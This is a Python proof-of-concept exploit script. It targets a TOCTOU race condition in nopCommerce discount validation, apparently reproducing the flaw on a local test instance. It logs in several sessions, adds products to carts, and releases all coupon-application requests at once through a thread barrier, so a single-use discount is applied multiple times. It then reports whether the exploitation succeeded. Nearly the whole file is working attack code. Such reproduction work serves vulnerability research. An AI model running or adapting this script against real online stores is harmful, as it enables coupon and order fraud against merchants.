#!/usr/bin/env python3
"""
Concurrent Order Requests for Race Condition Testing

This script sends multiple concurrent order requests with the same discount code
to exploit the TOCTOU race condition in nopCommerce discount validation.

Vulnerability Flow:
1. Thread A: ValidateDiscount() - Check: usage_count=0 < limit=1 -> PASS
2. Thread B: ValidateDiscount() - Check: usage_count=0 < limit=1 -> PASS
3. Thread A: PlaceOrder() -> Insert usage history (count becomes 1)
4. Thread B: PlaceOrder() -> Insert usage history (count becomes 2)
=> Discount used 2 times when limit is 1
"""

import requests
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import List, Optional

BASE_URL = "http://localhost:8080"
TEST_USER_EMAIL = "testuser@test.com"
TEST_USER_PASSWORD = "Test123!"

@dataclass
class OrderResult:
    thread_id: int
    success: bool
    status_code: int
    response_text: str
    order_id: Optional[str]
    timing_ms: float

class RaceConditionTester:
    def __init__(self, discount_code: str, num_threads: int = 10):
        self.discount_code = discount_code
        self.num_threads = num_threads
        self.sessions: List[requests.Session] = []
        self.results: List[OrderResult] = []
        self.barrier = threading.Barrier(num_threads)

    def create_session(self) -> requests.Session:
        """Create and authenticate a session"""
        session = requests.Session()

        # Get login page for anti-forgery token
        login_url = f"{BASE_URL}/login"
        response = session.get(login_url)

        # Extract anti-forgery token
        import re
        token_match = re.search(
            r'name="__RequestVerificationToken"[^>]*value="([^"]+)"',
            response.text
        )
        token = token_match.group(1) if token_match else ""

        # Login
        login_data = {
            "Email": TEST_USER_EMAIL,
            "Password": TEST_USER_PASSWORD,
            "__RequestVerificationToken": token,
            "RememberMe": "false"
        }

        response = session.post(login_url, data=login_data, allow_redirects=True)

        if "logout" in response.text.lower() or response.status_code == 200:
            print(f"[+] Session authenticated")
            return session
        else:
            print(f"[-] Session authentication failed")
            return None

    def add_product_to_cart(self, session: requests.Session) -> bool:
        """Add a product to the shopping cart"""
        # Get homepage to find products
        response = session.get(BASE_URL)

        # Find first product link
        import re
        product_match = re.search(r'href="(/[^"]*product[^"]*)"', response.text, re.IGNORECASE)

        if product_match:
            product_url = BASE_URL + product_match.group(1)
            response = session.get(product_url)

            # Find add-to-cart form
            token_match = re.search(
                r'name="__RequestVerificationToken"[^>]*value="([^"]+)"',
                response.text
            )
            token = token_match.group(1) if token_match else ""

            product_id_match = re.search(r'data-productid="(\d+)"', response.text)
            product_id = product_id_match.group(1) if product_id_match else "1"

            # Add to cart
            add_cart_url = f"{BASE_URL}/addproducttocart/details/{product_id}/1"
            cart_data = {
                "__RequestVerificationToken": token,
                "addtocart_{}.EnteredQuantity".format(product_id): "1"
            }

            response = session.post(add_cart_url, data=cart_data)
            return "success" in response.text.lower() or response.status_code == 200

        return False

    def apply_discount_and_checkout(self, session: requests.Session, thread_id: int) -> OrderResult:
        """Apply discount code and attempt checkout"""
        start_time = time.time()

        try:
            # Go to cart
            cart_url = f"{BASE_URL}/cart"
            response = session.get(cart_url)

            # Get anti-forgery token
            import re
            token_match = re.search(
                r'name="__RequestVerificationToken"[^>]*value="([^"]+)"',
                response.text
            )
            token = token_match.group(1) if token_match else ""

            # Apply discount code
            apply_discount_data = {
                "__RequestVerificationToken": token,
                "discountcouponcode": self.discount_code,
                "applydiscountcouponcode": "Apply coupon"
            }

            # Wait at barrier - all threads start simultaneously
            print(f"[Thread {thread_id}] Waiting at barrier...")
            self.barrier.wait()

            # CRITICAL TIMING: All threads send requests at the same time
            response = session.post(cart_url, data=apply_discount_data)
            elapsed_ms = (time.time() - start_time) * 1000

            # Check if discount was applied
            success = "applied" in response.text.lower() or "discount" in response.text.lower()

            # Try to proceed to checkout if discount applied
            order_id = None
            if success:
                # Attempt checkout
                checkout_url = f"{BASE_URL}/checkout"
                checkout_response = session.get(checkout_url)

                # Look for order confirmation
                order_match = re.search(r'order[^\d]*(\d+)', checkout_response.text, re.IGNORECASE)
                if order_match:
                    order_id = order_match.group(1)

            return OrderResult(
                thread_id=thread_id,
                success=success,
                status_code=response.status_code,
                response_text=response.text[:500],
                order_id=order_id,
                timing_ms=elapsed_ms
            )

        except Exception as e:
            elapsed_ms = (time.time() - start_time) * 1000
            return OrderResult(
                thread_id=thread_id,
                success=False,
                status_code=0,
                response_text=str(e),
                order_id=None,
                timing_ms=elapsed_ms
            )

    def run_concurrent_test(self):
        """Execute concurrent discount application"""
        print(f"\n{'='*60}")
        print(f"Race Condition Test - {self.num_threads} Concurrent Requests")
        print(f"Discount Code: {self.discount_code}")
        print(f"{'='*60}\n")

        # Create sessions for each thread
        print("[*] Creating authenticated sessions...")
        for i in range(self.num_threads):
            session = self.create_session()
            if session:
                self.add_product_to_cart(session)
                self.sessions.append(session)
            else:
                print(f"[-] Failed to create session {i}")

        if len(self.sessions) < 2:
            print("[-] Not enough sessions for race condition test")
            return

        print(f"[*] {len(self.sessions)} sessions ready")

        # Run concurrent requests
        print("\n[*] Launching concurrent requests...")

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = {
                executor.submit(
                    self.apply_discount_and_checkout,
                    session,
                    i
                ): i for i, session in enumerate(self.sessions)
            }

            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)

        self.analyze_results()

    def analyze_results(self):
        """Analyze test results for race condition exploitation"""
        print(f"\n{'='*60}")
        print("TEST RESULTS")
        print(f"{'='*60}")

        success_count = sum(1 for r in self.results if r.success)
        total_count = len(self.results)

        print(f"\nTotal Requests: {total_count}")
        print(f"Successful Discount Applications: {success_count}")
        print(f"Discount Limit: 1")

        print("\nDetailed Results:")
        for result in sorted(self.results, key=lambda x: x.thread_id):
            status = "[SUCCESS]" if result.success else "[FAILED]"
            print(f"  Thread {result.thread_id}: {status} - {result.timing_ms:.2f}ms")

        print(f"\n{'='*60}")
        if success_count > 1:
            print("VULNERABILITY CONFIRMED!")
            print(f"Discount was applied {success_count} times (limit: 1)")
            print("Race condition successfully exploited.")
        elif success_count == 1:
            print("NORMAL BEHAVIOR")
            print("Only 1 discount application succeeded (as expected)")
        else:
            print("TEST INCONCLUSIVE")
            print("No successful discount applications")
        print(f"{'='*60}")


def main():
    # Read discount code from file or argument
    discount_code = None

    if len(sys.argv) > 1:
        discount_code = sys.argv[1]
    else:
        try:
            with open('/home/clouditera/漏洞研判复现/test/discount_code.txt', 'r') as f:
                discount_code = f.read().strip()
        except:
            pass

    if not discount_code:
        print("Usage: python concurrent_order.py <DISCOUNT_CODE>")
        print("Or run poc_race_condition.js first to create a discount")
        sys.exit(1)

    tester = RaceConditionTester(discount_code, num_threads=5)
    tester.run_concurrent_test()


if __name__ == "__main__":
    main()
